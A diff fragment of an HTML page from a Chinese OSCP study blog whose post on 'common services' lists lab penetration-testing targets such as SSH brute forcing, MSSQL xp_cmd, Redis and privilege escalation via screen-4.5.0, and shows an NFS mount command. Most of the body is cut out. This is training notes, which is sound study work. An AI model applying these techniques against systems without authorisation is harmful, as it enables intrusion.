+先挂载在本地："><meta name=author content="养猪日记"><link rel=canonical href=http://localhost:1313/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/oscp/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">常见服务</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1137 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#nfs>NFS</a></li><li><a href=#ssh>SSH</a><ul><li><a href=#爆破>爆破</a></li><li><a href=#生成ssh公私钥>生成ssh公私钥</a></li><li><a href=#连接问题>连接问题</a></li></ul></li><li><a href=#ftp>FTP</a></li><li><a href=#smb>SMB</a></li></ul><ul><li><a href=#mssql>MSSQL</a><ul><li><a href=#xp_cmd>xp_cmd</a></li></ul></li><li><a href=#mongodb>mongodb</a></li><li><a href=#postgresql>PostgreSQL</a></li><li><a href=#rsync>RSYNC</a></li><li><a href=#tftp服务>TFTP服务</a></li><li><a href=#pop3-110>POP3 110</a></li><li><a href=#smtp-25>SMTP 25</a></li><li><a href=#winrm远程管理服务-59855986端口>WinRM远程管理服务 5985/5986端口</a></li><li><a href=#ldap>LDAP</a></li><li><a href=#redis>Redis</a></li><li><a href=#rpc>RPC</a></li><li><a href=#snmp-udp-161>SNMP UDP 161</a></li><li><a href=#netbios-139>NetBIOS 139</a></li></ul></nav></div></details></div><div class=post-content><p>渗透主要遵循高危服务为先的策略，以下为打靶过程中的记录：</p><h2 id=nfs>NFS<a hidden class=anchor aria-hidden=true href=#nfs>#</a></h2><pre tabindex=0><code>挂载：
 sudo mount -t nfs 192.168.154.130:/home/user/storage ./storage
 
 showmount 
@@ -679,8 +517,8 @@ aerospike数据库 3000端口
 putty RDP 提权
 screen-4.5.0 提权
 .git githack
-</code></pre></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://yangzhuzai.github.io/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/><span class=title>« Prev</span><br><span>客户端攻击</span>
-</a><a class=next href=https://yangzhuzai.github.io/posts/oscp/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/><span class=title>Next »</span><br><span>文件传输</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
+</code></pre></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/><span class=title>« Prev</span><br><span>客户端攻击</span>
+</a><a class=next href=http://localhost:1313/posts/oscp/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/><span class=title>Next »</span><br><span>文件传输</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>养猪日记</a></span> ·
 <span>Powered by
 <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
         <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
